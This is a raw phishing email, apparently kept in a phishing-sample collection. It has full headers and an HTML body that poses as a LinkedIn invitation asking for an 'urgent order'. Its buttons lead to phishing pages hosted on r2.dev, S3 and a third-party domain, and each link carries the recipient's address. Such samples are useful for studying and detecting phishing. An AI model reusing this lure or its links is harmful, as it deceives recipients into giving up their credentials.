@@ -1,0 +1,423 @@
+From jose@monkey.org Tue Nov  7 11:21:36 2023 +0000
+Return-Path: e-shop@nomura-nousan.co.jp
+Delivered-To: jose@monkey.org
+X-FDA: 81430917792.22.EA1F494
+Received: from s760880.srvape.com (s760880.srvape.com [91.219.150.90])
+	by imf03.b.hostedemail.com (Postfix) with ESMTP id 7A562120005
+	for <jose@monkey.org>; Tue,  7 Nov 2023 11:21:34 +0000 (UTC)
+Authentication-Results: imf03.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf03.b.hostedemail.com: 91.219.150.90 is neither permitted nor denied by domain of e-shop@nomura-nousan.co.jp) smtp.mailfrom=e-shop@nomura-nousan.co.jp;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1699356094;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=ZVs9hElGbzFHYV05vZW+6TC+2EYcNCmtHdfSl+9yYoM=;
+	b=2duEGccD16/SEfdWbsu+A9W135hEmnq9jknEq2dca3dw2FcZpsV6IP7oRFqr25O6AW8MLh
+	6DTpvFGhkdDJdws2tp82CwoOoThJWPHQkpB+QVVIep1EYo8WdK6s9it3V0yUg8JL1ZxWwO
+	VAilstYvDoDpG5W6twwQpOpxZR1CG98=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1699356094; a=rsa-sha256;
+	cv=none;
+	b=Ow99H/+iJL1BuFuuQE3V4qP7Xe/UeoeA27LPnMKWtIwZgjZ+W8nFf3Qf/B96PWu2TeudPO
+	1gIW4OoZOMeKiE/mktSh+v3fQmLNrMlKv1AouubzhR4aRWgoNW2jPiRISv0jJX6IFtEA+v
+	R5NpwGKQOn+vPO4FCQNHOZ9dnZVFz1U=
+ARC-Authentication-Results: i=1;
+	imf03.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf03.b.hostedemail.com: 91.219.150.90 is neither permitted nor denied by domain of e-shop@nomura-nousan.co.jp) smtp.mailfrom=e-shop@nomura-nousan.co.jp;
+	dmarc=none
+Received: from [86.38.225.123] (localhost [IPv6:::1])
+	by s760880.srvape.com (Postfix) with ESMTP id 1F87E25E5DE
+	for <jose@monkey.org>; Tue,  7 Nov 2023 14:17:11 +0300 (MSK)
+From: LinkedIn Business <e-shop@nomura-nousan.co.jp>
+To: jose@monkey.org
+Subject: New Order Request For "Tianjin Hongtai Pipe Industry Co.,Ltd"
+Date: 7 Nov 2023 03:17:11 -0800
+Message-ID: <20231107031711.B18880CDF7BADAF9@nomura-nousan.co.jp>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 7A562120005
+X-Stat-Signature: g4m5ked88u6wnzoh1n7ox8fuffkewqie
+X-Spam-Status: Yes, score=12.20
+X-Rspam-User: 
+X-HE-Tag: 1699356094-424726
+X-HE-Meta: U2FsdGVkX1/EU+kHc4y7LHzL+os3IMVfQO0GG2yyiAm8w84gn2Qrnp+OIlKavB3mmT5+Nrfh7WWBBzwuk/8ZT0L3pDz9+hMhgqmzBHZBvjhj+Bc9xjkig5rO1uie9T+jgtBLIiOLnKTcwuETv+wdy0xplgDaSjYjPD0uydZRu/SCiRfVBUng6SOLnOZ+1TkZ5v6bbgCZXWjV7z1XBxAlB1CixaFFJcw30cCUzvSFbVYXeIUj42V0ihMHcEN8DPOoX1xcoPPMQynSylwXfx/+uK/nvHDDHuO2Z66024MUdpI/e7xYNgQk3rD681CrRcAnnW42gMhg375R4DkxSDvojUGZg38Zw3bWcPaNIF2tA3c=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 360
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<table width=3D"100%" style=3D"width: 480px; color: rgb(34, 34, 34); text-t=
+ransform: none; letter-spacing: normal; font-family: Arial, Helvetica, sans=
+-serif; font-size: small; font-style: normal; font-weight: 400; word-spacin=
+g: 0px; white-space: normal; min-width: 100%; orphans: 2; widows: 2; font-v=
+ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
+dth: 0px; text-decoration-thickness: initial; text-decoration-style: initia=
+l; text-decoration-color: initial;" border=3D"0"=20
+cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"left" valign=3D=
+"middle" style=3D"margin: 0px;">
+<img height=3D"42" style=3D"margin: 0px; padding: 0px; border: 0px currentC=
+olor; border-image: none; color: rgb(255, 255, 255); outline-width: 0px; ou=
+tline-style: none;" alt=3D"LinkedIn"=20
+src=3D"https://ci6.googleusercontent.com/proxy/94Yh8FmVNd2jy__Oy8LEulIIi9fT=
+4nkPcPBcztrXuIrzEkb4RI1vndUkiYbvMrOj3tcRA_bFJdBRaaVLghL9-tn0jNcc-MG0EiiZOUs=
+gvgIDNzX3NOsEe45c_thqCsbNV4P8gWgNRZbtYM22R6J79kKTtSvk1HpWz2nPTYG3g3pSHnoZN7=
+VxNdi6Rf2UH0TBQ2zJ0yF7Bz3EnJvIHNHkDuhcu7GpfsyH_WJZOjXk0--aqXS6ywphck2bKKE9t=
+iLSTuI6fWSpLB6fLzlexNvqPmpfq9GXvhnb4Zjhph2boRkZ2aqSs6lCBSVIfRTL9Sg9AqMw2UuJ=
+IGw0n_l5sfG5OE1BsRwaf3EImESy_wUhm3Qhtzp_Zs1BfmHVSkC2ddIXqR3iVgAlF3OmPwBxf8E=
+mlOb4slBrkB6nDxRYXBDfq4sFI4-VFzj2ey9MFv6ONICdEe3pK-1
+l4El1jzhDCyW3gKl8AovPJblJDVVooqavkEXvHQF5xS80_MaagEzACeyJSsVWvF_yHd9VZY1Tkb=
+CUFN08Tf40hk9JYsfPSkWRq_dNyF2k-qBFTplDDOJN2meSQmm7QXKWqZeS437aaa_bvs9nNYRKs=
+et4FNjsn7edRbna-De2h1HHec_DhcX5VVM5VVqPvdowuzUUDZ9YRPYcVFhGy08LsIOGH5z9QJPI=
+THjhK5NmXvrEn7dWQTHn2E1TEhM4rncgTOGImEm9UA6cQJmKf0Os4CQpr8YWgt2-Ttg=3Ds0-d-=
+e1-ft#https://ecp.yusercontent.com/mail?url=3Dhttps%3A%2F%2Fwww.linkedin.co=
+m%2Fcomm%2Fdms%2Flogo%3FmidToken%3DAQHEXtdjxRYtWg%26midSig%3D0OPuUCdFlAQFE1=
+%26trk%3Deml-email_m2m_invite_reminder_02-null-22-null
+%26trkEmail%3Deml-email_m2m_invite_reminder_02-null-22-null-null-2860h9%257=
+Ekm41pkd4%257E5f-null-comms%257Ebadging%257Edynamic%26lipi%3Durn%253Ali%253=
+Apage%253Aemail_email_m2m_invite_reminder_02%253Bxt0EpUMVQn2mrBu76R9a7w%253=
+D%253D%26_sig%3D1X8YjrWzRAQFE1&amp;t=3D1615982539&amp;ymreqid=3D0a26156f-24=
+9f-665e-1c9f-2a004d01b300&amp;sig=3Ds6khf99nD9l98lrrk.bDhw--~D" border=3D"0=
+"></td><td width=3D"100%" align=3D"right" valign=3D"middle" style=3D"margin=
+: 0px;">
+<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbo=
+dy><tr><td align=3D"left" valign=3D"middle" style=3D"margin: 0px; padding: =
+7px 0px 0px 10px;"><p style=3D"margin: 0px;"></p><div style=3D"border-width=
+: 0px; margin: 0px; padding: 0px; outline-width: 0px; outline-style: none;"=
+><span style=3D"border-width: 0px; margin: 0px; padding: 0px; outline-width=
+: 0px; outline-style: none;"><span style=3D"border-width: 0px; margin: 0px;=
+ padding: 0px; outline-width: 0px; outline-style: none;">
+<a style=3D"color: rgb(17, 85, 204);" target=3D"_blank" rel=3D"noreferrer">=
+<font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: inh=
+erit;">jose@monkey.org</font></font></a></span></span></div><div style=3D"b=
+order-width: 0px; margin: 0px; padding: 0px; outline-width: 0px; outline-st=
+yle: none;"><span style=3D"border-width: 0px; margin: 0px; padding: 0px; ou=
+tline-width: 0px; outline-style: none;"></span></div></td>
+<td width=3D"40" valign=3D"middle" style=3D"margin: 0px; padding-top: 7px; =
+padding-left: 10px;">
+<img width=3D"42" height=3D"42" style=3D"margin: 0px; padding: 0px; border:=
+ 0px currentColor; border-image: none; display: block; outline-width: 0px; =
+outline-style: none;"=20
+src=3D"https://ci6.googleusercontent.com/proxy/EfzWSUcSjRjYsgOx10vbL9_wZfhE=
+Q5Y_Ke7jFVM4OU6Kjc8PW6yzIlzg7jNeQ2iY-YGDXWId8SenKp2WP9xDcjF9M03Oun9Sb79xU6c=
+MoPoSK4cmOcefqp51w863jkDBnyoh4ZRMmTtbKoJyil9txtqzQy1usYtlX4IxepEpu_Raf9urrs=
+rA37XNqSv8DmShzOZGA7vH55JRbeXhvjXktFgVP4HEi-FFxuZnCW9ezqmEo0oXCLqm4AewXFS1y=
+_YZOpRu8uToVKgLj9yjbC-Ztwn9C5ksxDtCR7Y76VRxe_HmzmmkikhwRgBFvY65Cb_rJyL6Gsnf=
+fQtGScr9S-mjiltpGkCqUQiVDVIDb0D1o6jCXZ2Q_0r-OOd3eRxIFYKTrPBZPBxK5GW9lh3NHyq=
+AafrTfUYop_wUyrALJwB4ku8cMxTfHQ7-Nl36DFIPVnpA86iGgYu
+qQUo=3Ds0-d-e1-ft#https://ecp.yusercontent.com/mail?url=3Dhttps%3A%2F%2Fsta=
+tic.cdn.responsys.net%2Fi2%2Fresponsysimages%2Flinkedincn%2Fcontentlibrary%=
+2Fcampaigns%2Fb2b-20210316-lms-inspotlight-a%5Bother%5D%2Fb2b-20210316-lms-=
+in-spotlight%2Fimg%2Fyenan.jpg&amp;t=3D1615982674&amp;ymreqid=3D0a26156f-24=
+9f-665e-1c1a-ee000401f800&amp;sig=3DqEcFkhxHlJ170R_sk4rcNg--~D"></td></tr><=
+/tbody></table></td><td width=3D"1" style=3D"margin: 0px;">&nbsp;</td></tr>=
+</tbody></table>
+<table width=3D"100%" style=3D"color: rgb(34, 34, 34); text-transform: none=
+; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-s=
+ize: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-=
+space: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font-=
+variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thick=
+ness: initial; text-decoration-style: initial; text-decoration-color: initi=
+al;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody><tr><td style=3D"margin: 0px; padding: 24px 24px 16px;"><p style=3D"=
+margin: 0px; line-height: 1.5; font-size: 16px;"><span style=3D"border-widt=
+h: 0px; margin: 0px; padding: 0px; outline-width: 0px; outline-style: none;=
+"><font style=3D"vertical-align: inherit;"><font color=3D"#ff0000" style=3D=
+"vertical-align: inherit;"><b>I would like to request an urgent order. Plea=
+se accept my invitation and send me business terms immediately.</b></font><=
+/font></span></p></td></tr><tr>
+<td style=3D"margin: 0px; padding: 0px 24px 18px;"><span style=3D"border-wi=
+dth: 0px; margin: 0px; padding: 0px 6px 0px 0px; outline-width: 0px; outlin=
+e-style: none;"><table style=3D"padding-bottom: 6px; display: inline-block;=
+" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"=
+center" valign=3D"middle" style=3D"margin: 0px;">
+<a style=3D"color: rgb(0, 115, 177); display: block; white-space: nowrap; t=
+ext-decoration-line: none;" href=3D"https://pub-a8ed7885114f43bb97f4bf4057d=
+d6dcf.r2.dev/bgt.html#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer"=
+ data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://pub-a8ed788=
+5114f43bb97f4bf4057dd6dcf.r2.dev/bgt.html%23%5B%5B-Email-%5D%5D&amp;source=
+=3Dgmail&amp;ust=3D1699437752105000&amp;usg=3DAOvVaw2wJaAc04kRiyvvvyvyxZ5s"=
+><table border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr>
+<td style=3D"margin: 0px; padding: 6px 16px; border-radius: 2px; border: 1p=
+x solid rgb(0, 115, 177); color: rgb(255, 255, 255); font-size: 16px; backg=
+round-color: rgb(0, 115, 177);" bgcolor=3D"#0073b1">
+<a style=3D"color: rgb(255, 255, 255); display: inline-block; text-decorati=
+on-line: none;" href=3D"https://pub-ee8d20b8fcbf42e194db999ea82ea558.r2.dev=
+/bgt.html#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer" data-safere=
+directurl=3D"https://www.google.com/url?q=3Dhttps://pub-a8ed7885114f43bb97f=
+4bf4057dd6dcf.r2.dev/bgt.html%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;=
+ust=3D1699437752105000&amp;usg=3DAOvVaw2wJaAc04kRiyvvvyvyxZ5s"><font style=
+=3D"vertical-align: inherit;"><font style=3D"vertical-align: inherit;">
+accept</font></font></a></td></tr></tbody></table></a></td></tr></tbody></t=
+able>&nbsp;</span>&nbsp;&nbsp;&nbsp;<table style=3D"padding-bottom: 6px; di=
+splay: inline-block;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbo=
+dy><tr><td align=3D"center" valign=3D"middle" style=3D"margin: 0px;">
+<a style=3D"color: rgb(0, 115, 177); display: block; white-space: nowrap; t=
+ext-decoration-line: none;" href=3D"https://minzelpharma.in/MA/linkedin_/in=
+dex.php?email=3Dmarketing@platinumpharmatech.com" target=3D"_blank" rel=3D"=
+noreferrer" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://=
+minzelpharma.in/MA/linkedin_/index.php?email%3Dmarketing@platinumpharmatech=
+=2Ecom&amp;source=3Dgmail&amp;ust=3D1699437752105000&amp;usg=3DAOvVaw0667c_=
+16c_9Wjlebk_SwFS"><table border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody><tr><td style=3D"margin: 0px; padding: 6px 16px; border-radius: 2px;=
+ border: 1px solid rgb(0, 115, 177); font-size: 16px;">
+<a style=3D"color: rgb(0, 115, 177); display: inline-block; text-decoration=
+-line: none;" href=3D"https://pub-ee8d20b8fcbf42e194db999ea82ea558.r2.dev/b=
+gt.html#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer" data-saferedi=
+recturl=3D"https://www.google.com/url?q=3Dhttps://pub-a8ed7885114f43bb97f4b=
+f4057dd6dcf.r2.dev/bgt.html%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;us=
+t=3D1699437752105000&amp;usg=3DAOvVaw2wJaAc04kRiyvvvyvyxZ5s"><font style=3D=
+"vertical-align: inherit;"><font style=3D"vertical-align: inherit;">
+Reply message</font></font></a></td></tr></tbody></table></a></td></tr></tb=
+ody></table></td></tr><tr><td style=3D"margin: 0px;"><hr style=3D"margin: 0=
+px; border: 0px solid rgb(217, 217, 217); color: rgb(217, 217, 217); min-he=
+ight: 1px; background-color: rgb(217, 217, 217);"></td></tr></tbody></table=
+>
+<table width=3D"100%" style=3D"color: rgb(34, 34, 34); text-transform: none=
+; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-s=
+ize: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-=
+space: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font-=
+variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thick=
+ness: initial; text-decoration-style: initial; text-decoration-color: initi=
+al;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody><tr><td style=3D"margin: 0px; padding: 20px 24px;"><table width=3D"1=
+00%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td style=
+=3D"margin: 0px;"><table width=3D"100%" align=3D"left" border=3D"0" cellspa=
+cing=3D"0" cellpadding=3D"0"><tbody><tr><td width=3D"54" valign=3D"middle" =
+style=3D"margin: 0px; width: 54px; padding-right: 12px; vertical-align: mid=
+dle;">
+<img width=3D"84" height=3D"84" style=3D"margin: 0px; padding: 0px; border:=
+ 0px currentColor; border-image: none; display: block; outline-width: 0px; =
+outline-style: none;"=20
+src=3D"https://ci6.googleusercontent.com/proxy/EfzWSUcSjRjYsgOx10vbL9_wZfhE=
+Q5Y_Ke7jFVM4OU6Kjc8PW6yzIlzg7jNeQ2iY-YGDXWId8SenKp2WP9xDcjF9M03Oun9Sb79xU6c=
+MoPoSK4cmOcefqp51w863jkDBnyoh4ZRMmTtbKoJyil9txtqzQy1usYtlX4IxepEpu_Raf9urrs=
+rA37XNqSv8DmShzOZGA7vH55JRbeXhvjXktFgVP4HEi-FFxuZnCW9ezqmEo0oXCLqm4AewXFS1y=
+_YZOpRu8uToVKgLj9yjbC-Ztwn9C5ksxDtCR7Y76VRxe_HmzmmkikhwRgBFvY65Cb_rJyL6Gsnf=
+fQtGScr9S-mjiltpGkCqUQiVDVIDb0D1o6jCXZ2Q_0r-OOd3eRxIFYKTrPBZPBxK5GW9lh3NHyq=
+AafrTfUYop_wUyrALJwB4ku8cMxTfHQ7-Nl36DFIPVnpA86iGgYu
+qQUo=3Ds0-d-e1-ft#https://ecp.yusercontent.com/mail?url=3Dhttps%3A%2F%2Fsta=
+tic.cdn.responsys.net%2Fi2%2Fresponsysimages%2Flinkedincn%2Fcontentlibrary%=
+2Fcampaigns%2Fb2b-20210316-lms-inspotlight-a%5Bother%5D%2Fb2b-20210316-lms-=
+in-spotlight%2Fimg%2Fyenan.jpg&amp;t=3D1615982674&amp;ymreqid=3D0a26156f-24=
+9f-665e-1c1a-ee000401f800&amp;sig=3DqEcFkhxHlJ170R_sk4rcNg--~D"></td><td va=
+lign=3D"middle" style=3D"margin: 0px; padding: 12px 0px; vertical-align: mi=
+ddle;">
+<table align=3D"left" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbo=
+dy><tr><td align=3D"left" style=3D"margin: 0px;"><font style=3D"vertical-al=
+ign: inherit;"><b><font style=3D"vertical-align: inherit;">Boon-Nam&nbsp;</=
+font><font size=3D"2"><span style=3D"border-width: 0px; margin: 0px; paddin=
+g: 0px; color: rgb(38, 38, 38); line-height: 1.5; outline-width: 0px; outli=
+ne-style: none;"><font style=3D"vertical-align: inherit;">Bang, Sao Thong, =
+Thailand</font></span></font></b></font>
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(38,=
+ 38, 38); line-height: 1.5; font-size: 16px; font-weight: 700; outline-widt=
+h: 0px; outline-style: none;"><br></span><font size=3D"2"><span style=3D"bo=
+rder-width: 0px; margin: 0px; padding: 0px; color: rgb(38, 38, 38); line-he=
+ight: 1.5; outline-width: 0px; outline-style: none;"><font style=3D"vertica=
+l-align: inherit;"></font></span></font></td></tr><tr><td align=3D"left" st=
+yle=3D"margin: 0px;">
+<p style=3D"margin: 0px; line-height: 1.4;"><span style=3D"border-width: 0p=
+x; margin: 0px; padding: 0px; outline-width: 0px; outline-style: none;"><fo=
+nt style=3D"vertical-align: inherit;"><font style=3D"vertical-align: inheri=
+t;"><span style=3D"color: rgb(0, 0, 0); font-family: Arial; font-size: 14px=
+;">Tianjin Hongtai Pipe Industry Co.,</span>&nbsp;- CEO</font></font></span=
+></p></td></tr></tbody></table></td><td align=3D"right" valign=3D"middle" s=
+tyle=3D"margin: 0px; padding-left: 16px; white-space: nowrap;">
+<br></td></tr><tr><td style=3D"margin: 0px;">&nbsp;</td><td style=3D"margin=
+: 0px;"><table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D=
+"0"><tbody><tr><td valign=3D"top" style=3D"margin: 0px; padding-right: 5px;=
+ vertical-align: top;">
+<img width=3D"16" height=3D"16" style=3D"margin: 0px; padding: 0px; border:=
+ 0px currentColor; border-image: none; color: rgb(255, 255, 255); outline-w=
+idth: 0px; outline-style: none;"=20
+src=3D"https://ci5.googleusercontent.com/proxy/2AhreaR2Pjz5Dzz8443Ho3hZlyvX=
+Y6VWOckBYqKiYqtHe7JJCwb6EUGXHEwY3mQu9iVck5yBe6RTtj4XW04rrVVxApiRlePAxoS6sjd=
+Sfzl2iAoR1q1qnSSjQcnwx5ubgDfXUqDMNTI_33pynqzvILdF6iTrHkC97xcJkHa4ezR6sbcSsg=
+8wsF-FwPAsWFGJ16KJUav-v0d77RKNu3fi1QO0itXqJ1f0iGru3Wt-Tevhtz2G093yFwMaWh2Kz=
+bKf0qy3hLe8Rqlh00mBqsOPvcRrmSHog1ari3FoT69K02Tb07Rf8yRxxsIlWiLralRObHXUIA9j=
+GRjSI-UTMlqU3QbuV4ROApBIelBve-fWMlciSTvRPTgQBlpOD4msh7lRtvCnZNj18ZUrbU4FVCO=
+_a8wdT9dcvOjHFOSPeGPuHCRdcnlt4ot8c2jqW4OfGMZB00wxWCK
+PbB7XxHcdw9b_VanBWHYR_WYndcXyiaPF6JvQ1dUlo_U2vUx_97YVl5T0-0zHq8nwTIurSnASXt=
+hCXNvQ5Q=3Ds0-d-e1-ft#https://ecp.yusercontent.com/mail?url=3Dhttps%3A%2F%2=
+Fstatic.licdn.com%2Fsc%2Fp%2Fcom.linkedin.email-assets-frontend%253Aemail-a=
+ssets-frontend-static-content%252B__latest__%2Ff%2F%252Femail-assets-fronte=
+nd%252Fimages%252Femail%252Fphoenix%252Ficons%252Ficon_phoenix_connect_in_c=
+ommon_32x32_v1.png&amp;t=3D1615982539&amp;ymreqid=3D0a26156f-249f-665e-1c9f=
+-2a004d01b300&amp;sig=3DOteLgeZjvlR8YxVcQbW1pg--~D"></td>
+<td style=3D"margin: 0px;"><span style=3D"border-width: 0px; margin: 0px; p=
+adding: 0px; outline-width: 0px; outline-style: none;"><font style=3D"verti=
+cal-align: inherit;"><font style=3D"vertical-align: inherit;"><b>You have 4=
+23 connections in common</b></font></font></span></td></tr></tbody></table>=
+</td></tr><tr><td style=3D"margin: 0px;">&nbsp;</td></tr><tr><td style=3D"m=
+argin: 0px;"><br></td><td align=3D"left" style=3D"margin: 0px;">
+<div style=3D"border-width: 0px; margin: 0px; padding: 0px; outline-width: =
+0px; outline-style: none;"><table align=3D"left" style=3D"padding-top: 4px;=
+" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"=
+right" valign=3D"middle" style=3D"margin: 0px;">
+<a style=3D"color: rgb(0, 115, 177); display: inline-block; text-decoration=
+-line: none;" href=3D"https://www.linkedin.com/comm/in/%E7B4-%E9%A9%AC-8863=
+82204?midToken=3DAQHEXtdjxRYtWg&amp;midSig=3D0OPuUCdFlAQFE1&amp;trk=3Deml-e=
+mail_m2m_invite_reminder_02-hero-4-profile_text&amp;trkEmail=3Deml-email_m2=
+m_invite_reminder_02-hero-4-profile_text-null-2860h9%7Ekm41pkd4%7E5f-null-n=
+eptune%2Fprofile%7Evanity%2Eview&amp;lipi=3Durn%3Ali%3Apage%3Aemail_email_m=
+2m_invite_reminder_02%3Bxt0EpUMVQn2mrBu76R9a7w%3D%3D"=20
+target=3D"_blank" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://www.linkedin=
+=2Ecom/comm/in/%25E7B4-%25E9%25A9%25AC-886382204?midToken%3DAQHEXtdjxRYtWg%=
+26midSig%3D0OPuUCdFlAQFE1%26trk%3Deml-email_m2m_invite_reminder_02-hero-4-p=
+rofile_text%26trkEmail%3Deml-email_m2m_invite_reminder_02-hero-4-profile_te=
+xt-null-2860h9%257Ekm41pkd4%257E5f-null-neptune%252Fprofile%257Evanity%252E=
+view%26lipi%3Durn%253Ali%253Apage%253Aemail_email_m2m_invite_reminder_02%25=
+3Bxt0EpUMVQn2mrBu76R9a7w%253D%253D&amp;source=3Dgmail&amp;
+ust=3D1699437752105000&amp;usg=3DAOvVaw3tiv53yQpr1ENNqSEhByF3"><table style=
+=3D"display: inline-block;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0=
+"><tbody><tr><td align=3D"center" valign=3D"middle" style=3D"margin: 0px;">=
+
+<a style=3D"color: rgb(0, 115, 177); display: block; white-space: nowrap; t=
+ext-decoration-line: none;"=20
+href=3D"https://www.linkedin.com/comm/in/%E7B4-%E9%A9%AC-886382204?midToken=
+=3DAQHEXtdjxRYtWg&amp;midSig=3D0OPuUCdFlAQFE1&amp;trk=3Deml-email_m2m_invit=
+e_reminder_02-hero-4-profile_text&amp;trkEmail=3Deml-email_m2m_invite_remin=
+der_02-hero-4-profile_text-null-2860h9%7Ekm41pkd4%7E5f-null-neptune%2Fprofi=
+le%7Evanity%2Eview&amp;lipi=3Durn%3Ali%3Apage%3Aemail_email_m2m_invite_remi=
+nder_02%3Bxt0EpUMVQn2mrBu76R9a7w%3D%3D" target=3D"_blank" rel=3D"noreferrer=
+"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://www.linkedin=
+=2Ecom/comm/in/%25E7B4-%25E9%25A9%25AC-886382204?midToken%3DAQHEXtdjxRYtWg%=
+26midSig%3D0OPuUCdFlAQFE1%26trk%3Deml-email_m2m_invite_reminder_02-hero-4-p=
+rofile_text%26trkEmail%3Deml-email_m2m_invite_reminder_02-hero-4-profile_te=
+xt-null-2860h9%257Ekm41pkd4%257E5f-null-neptune%252Fprofile%257Evanity%252E=
+view%26lipi%3Durn%253Ali%253Apage%253Aemail_email_m2m_invite_reminder_02%25=
+3Bxt0EpUMVQn2mrBu76R9a7w%253D%253D&amp;source=3Dgmail&amp;
+ust=3D1699437752105000&amp;usg=3DAOvVaw3tiv53yQpr1ENNqSEhByF3"><table borde=
+r=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td style=3D"margin:=
+ 0px;">
+<a style=3D"color: rgb(0, 115, 177); display: inline-block; text-decoration=
+-line: none;" href=3D"https://pub-ee8d20b8fcbf42e194db999ea82ea558.r2.dev/b=
+gt.html#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer" data-saferedi=
+recturl=3D"https://www.google.com/url?q=3Dhttps://pub-a8ed7885114f43bb97f4b=
+f4057dd6dcf.r2.dev/bgt.html%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;us=
+t=3D1699437752105000&amp;usg=3DAOvVaw2wJaAc04kRiyvvvyvyxZ5s"><font style=3D=
+"vertical-align: inherit;"><font style=3D"vertical-align: inherit;">
+checking data</font></font></a></td></tr></tbody></table></a></td></tr></tb=
+ody></table></a></td></tr></tbody></table></div></td><td style=3D"margin: 0=
+px;"><br></td></tr></tbody></table></td></tr></tbody></table></td></tr></tb=
+ody></table>
+<div style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(34, =
+34, 34); text-transform: none; text-indent: 0px; letter-spacing: normal; fo=
+nt-family: Arial, Helvetica, sans-serif; font-size: small; font-style: norm=
+al; font-weight: 400; word-spacing: 0px; white-space: normal; outline-width=
+: 0px; outline-style: none; orphans: 2; widows: 2; font-variant-ligatures: =
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;"><div style=3D"border-width: 0px; =
+margin: 0px; padding: 0px; outline-width: 0px; outline-style: none;"></div>=
+<div style=3D"border-width: 0px; margin: 0px; padding: 0px; outline-width: =
+0px; outline-style: none;"></div></div>
+<table width=3D"100%" align=3D"center" style=3D"padding: 0px 24px; text-ali=
+gn: center; color: rgb(106, 108, 109); text-transform: none; letter-spacing=
+: normal; font-family: Arial, Helvetica, sans-serif; font-size: small; font=
+-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; o=
+rphans: 2; widows: 2; background-color: rgb(237, 240, 243); font-variant-li=
+gatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px;=
+ text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;" bgcolor=3D=
+"#edf0f3" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td a=
+lign=3D"center" style=3D"margin: 0px; padding: 16px 0px 0px;"><table width=
+=3D"100%" align=3D"center" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"=
+><tbody><tr><td align=3D"center" valign=3D"middle" style=3D"margin: 0px; pa=
+dding: 0px 0px 16px; text-align: center; vertical-align: middle;">
+<a style=3D"color: rgb(106, 108, 109); display: inline-block;" href=3D"http=
+s://hubs.ly/Q01sqhNt0#jose@monkey.org&amp;1V00-22" target=3D"_blank" rel=3D=
+"noreferrer" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps:/=
+/hubs.ly/Q01sqhNt0%23%5B%5B-Email-%5D%5D%261V00-22&amp;source=3Dgmail&amp;u=
+st=3D1699437752105000&amp;usg=3DAOvVaw2MnwrzkwUM1wv-YAthGcKs"><font style=
+=3D"vertical-align: inherit;"><font style=3D"vertical-align: inherit;">unsu=
+bscribe</font></font></a><font style=3D"vertical-align: inherit;">
+<font style=3D"vertical-align: inherit;">&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;</f=
+ont></font>
+<a style=3D"color: rgb(106, 108, 109); display: inline-block;" href=3D"http=
+s://s3.amazonaws.com/appforest_uf/f1668071910566x136025853984276910/indexRR=
+RRR.html#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer" data-safered=
+irecturl=3D"https://www.google.com/url?q=3Dhttps://s3.amazonaws.com/appfore=
+st_uf/f1668071910566x136025853984276910/indexRRRRR.html%23%5B%5B-Email-%5D%=
+5D&amp;source=3Dgmail&amp;ust=3D1699437752105000&amp;usg=3DAOvVaw2WrqpFwoqm=
+-fvoGT7YYky5"><font style=3D"vertical-align: inherit;">
+<font style=3D"vertical-align: inherit;">help</font></font></a></td></tr></=
